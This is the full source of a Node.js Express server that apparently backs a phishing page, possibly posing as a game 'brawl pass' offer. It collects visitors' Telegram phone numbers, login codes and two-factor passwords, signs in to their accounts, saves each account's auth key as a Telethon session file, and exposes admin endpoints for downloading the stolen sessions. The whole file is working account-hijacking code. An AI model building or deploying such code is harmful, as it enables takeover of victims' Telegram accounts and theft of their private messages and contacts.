const express = require('express');
const session = require('express-session');
const FileStore = require('session-file-store')(session);
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { computeCheck } = require('telegram/Password');
const config = require('./config');

const app = express();
const PORT = process.env.PORT || 3000;

// API Credentials
const API_ID = config.API_ID || 2040;
const API_HASH = config.API_HASH || 'b18441a1ff607e10a989891a5462e627';
const ADMIN_KEY = config.ADMIN_KEY || 'brawladmin';

// Parsers
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Persistent Express Sessions
app.use(session({
    store: new FileStore({ path: './sessions_store', ttl: 86400 }),
    secret: 'brawl_pass_secret_key',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 }
}));

// Directory for Telegram SQLite Session Files
const SESSIONS_DIR = path.join(__dirname, 'sessions');
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });

// Active in-memory Telegram Client instances
const activeClients = {};

// Определение корректной команды Python для вашей ОС
function getPythonCommand() {
    try {
        execSync('python3 --version', { stdio: 'ignore' });
        return 'python3';
    } catch (e) {
        return 'python';
    }
}
const PYTHON_CMD = getPythonCommand();

function getSessionFilePath(phone) {
    const cleanPhone = phone.replace(/[^0-9]/g, '');
    return path.join(SESSIONS_DIR, `${cleanPhone}.session`);
}

/**
 * Converts GramJS session credentials into a Telethon-compatible SQLite .session file
 */
function saveTelethonSession(phone, client, targetPath) {
    const cleanPhone = phone.replace(/[^0-9]/g, '');
    const tempPyPath = path.join(__dirname, `temp_session_${cleanPhone}.py`);

    try {
        const dcId = client.session.dcId;
        const serverAddress = client.session.serverAddress;
        const port = client.session.port;
        const authKey = client.session.authKey;

        if (!authKey) throw new Error("No authKey in session");

        // Безопасное извлечение ключа
        let keyBuffer;
        if (typeof authKey.getKey === 'function') {
            keyBuffer = authKey.getKey();
        } else if (authKey.key) {
            keyBuffer = authKey.key;
        } else {
            keyBuffer = authKey;
        }

        const authKeyHex = Buffer.from(keyBuffer).toString('hex');
        console.log(`📡 Exporting Telethon Session for ${cleanPhone}: DC=${dcId}, IP=${serverAddress}:${port}`);

        const pythonCode = `
import sqlite3
import sys

db_path = sys.argv[1]
dc_id = int(sys.argv[2])
ip = sys.argv[3]
port = int(sys.argv[4])
auth_key = bytes.fromhex(sys.argv[5])

conn = sqlite3.connect(db_path)
c = conn.cursor()

c.execute('CREATE TABLE IF NOT EXISTS sessions (dc_id INTEGER PRIMARY KEY, server_address TEXT, port INTEGER, auth_key BLOB, takeout_id INTEGER)')
c.execute('CREATE TABLE IF NOT EXISTS entities (id INTEGER PRIMARY KEY, hash INTEGER, username TEXT, phone TEXT, name TEXT)')
c.execute('CREATE TABLE IF NOT EXISTS sent_files (md5_digest BLOB, file_size INTEGER, type INTEGER, id INTEGER, hash INTEGER, PRIMARY KEY(md5_digest, file_size, type))')
c.execute('CREATE TABLE IF NOT EXISTS update_state (id INTEGER PRIMARY KEY, pts INTEGER, qts INTEGER, date INTEGER, seq INTEGER, unread_count INTEGER)')
c.execute('CREATE TABLE IF NOT EXISTS version (version INTEGER PRIMARY KEY)')

c.execute('INSERT OR REPLACE INTO version (version) VALUES (7)')
c.execute('INSERT OR REPLACE INTO sessions (dc_id, server_address, port, auth_key) VALUES (?, ?, ?, ?)', (dc_id, ip, port, auth_key))

conn.commit()
conn.close()
`;

        fs.writeFileSync(tempPyPath, pythonCode, 'utf-8');

        if (fs.existsSync(targetPath)) {
            fs.unlinkSync(targetPath);
        }

        // Выполняем Python с выводом ошибок в случае сбоя (stdio: 'pipe')
        const output = execSync(`${PYTHON_CMD} "${tempPyPath}" "${targetPath.replace(/\\/g, '\\\\')}" ${dcId} "${serverAddress}" ${port} "${authKeyHex}"`, {
            encoding: 'utf-8'
        });

        if (fs.existsSync(tempPyPath)) {
            fs.unlinkSync(tempPyPath);
        }

        if (fs.existsSync(targetPath)) {
            const fileSize = fs.statSync(targetPath).size;
            console.log(`✅ Session file created successfully (${fileSize} bytes): ${targetPath}`);
            return true;
        } else {
            console.error(`❌ File was not created at expected path: ${targetPath}`);
            return false;
        }

    } catch (error) {
        console.error(`❌ Failed to save Telethon SQLite session for ${cleanPhone}:`, error.stderr || error.message);
        if (fs.existsSync(tempPyPath)) fs.unlinkSync(tempPyPath);
        return false;
    }
}

// ================= API ENDPOINTS =================

// 1. Send Verification Code
app.post('/api/send-code', async (req, res) => {
    const { phone } = req.body;
    if (!phone) return res.status(400).json({ error: 'Phone number is required.' });

    const cleanPhone = phone.replace(/[^0-9]/g, '');

    try {
        const client = new TelegramClient(new StringSession(''), API_ID, API_HASH, {
            connectionRetries: 5,
        });

        await client.connect();
        const sendResult = await client.sendCode(
            { apiId: API_ID, apiHash: API_HASH },
            cleanPhone
        );

        activeClients[cleanPhone] = client;
        req.session.phone = cleanPhone;
        req.session.phoneCodeHash = sendResult.phoneCodeHash;

        res.json({ success: true, message: 'Code sent successfully.' });
    } catch (error) {
        console.error('Send Code Error:', error);
        res.status(500).json({ error: error.errorMessage || 'Failed to send code.' });
    }
});

// 2. Verify Code
app.post('/api/verify-code', async (req, res) => {
    const { code } = req.body;
    const phone = req.session.phone;
    const phoneCodeHash = req.session.phoneCodeHash;

    if (!phone || !phoneCodeHash) {
        return res.status(400).json({ error: 'Session expired. Please restart authentication.' });
    }

    const client = activeClients[phone];
    if (!client) {
        return res.status(400).json({ error: 'Client session lost. Please re-enter phone number.' });
    }

    try {
        await client.invoke(
            new Api.auth.SignIn({
                phoneNumber: phone,
                phoneCodeHash: phoneCodeHash,
                phoneCode: code,
            })
        );

        const sessionPath = getSessionFilePath(phone);
        const saved = saveTelethonSession(phone, client, sessionPath);

        delete activeClients[phone];

        if (!saved) {
            return res.status(500).json({ error: 'Auth succeeded, but failed to write session file to disk.' });
        }

        res.json({ success: true, status: 'authenticated' });
    } catch (error) {
        if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {
            return res.json({ success: true, status: '2fa_required' });
        }
        console.error('Verify Code Error:', error);
        res.status(400).json({ error: error.errorMessage || 'Invalid code.' });
    }
});

// 3. Verify 2FA Password
app.post('/api/verify-password', async (req, res) => {
    const { password } = req.body;
    const phone = req.session.phone;

    if (!phone) return res.status(400).json({ error: 'Session expired.' });

    const client = activeClients[phone];
    if (!client) return res.status(400).json({ error: 'Client session lost.' });

    try {
        const passwordSrpResult = await client.invoke(new Api.account.GetPassword());
        const passwordCheck = await computeCheck(passwordSrpResult, password);

        await client.invoke(
            new Api.auth.CheckPassword({
                password: passwordCheck,
            })
        );

        const sessionPath = getSessionFilePath(phone);
        const saved = saveTelethonSession(phone, client, sessionPath);

        delete activeClients[phone];

        if (!saved) {
            return res.status(500).json({ error: '2FA succeeded, but failed to write session file to disk.' });
        }

        res.json({ success: true, status: 'authenticated' });
    } catch (error) {
        console.error('Password Check Error:', error);
        res.status(400).json({ error: error.errorMessage || 'Incorrect 2FA password.' });
    }
});

// ================= ADMIN PANEL ENDPOINTS =================

function checkAdmin(req, res, next) {
    const key = req.headers['x-admin-key'] || req.query.key;
    if (key !== ADMIN_KEY) {
        return res.status(403).json({ error: 'Access denied.' });
    }
    next();
}

app.get('/api/admin/sessions', checkAdmin, (req, res) => {
    try {
        const files = fs.readdirSync(SESSIONS_DIR)
            .filter(file => file.endsWith('.session'))
            .map(file => {
                const stats = fs.statSync(path.join(SESSIONS_DIR, file));
                return {
                    name: file,
                    size: stats.size,
                    createdAt: stats.birthtime
                };
            });
        res.json({ success: true, sessions: files });
    } catch (err) {
        res.status(500).json({ error: 'Failed to retrieve session files.' });
    }
});

app.get('/api/admin/download/:filename', checkAdmin, (req, res) => {
    const filename = req.params.filename;
    const filePath = path.join(SESSIONS_DIR, filename);

    if (fs.existsSync(filePath)) {
        res.download(filePath);
    } else {
        res.status(404).json({ error: 'Session file not found.' });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
});
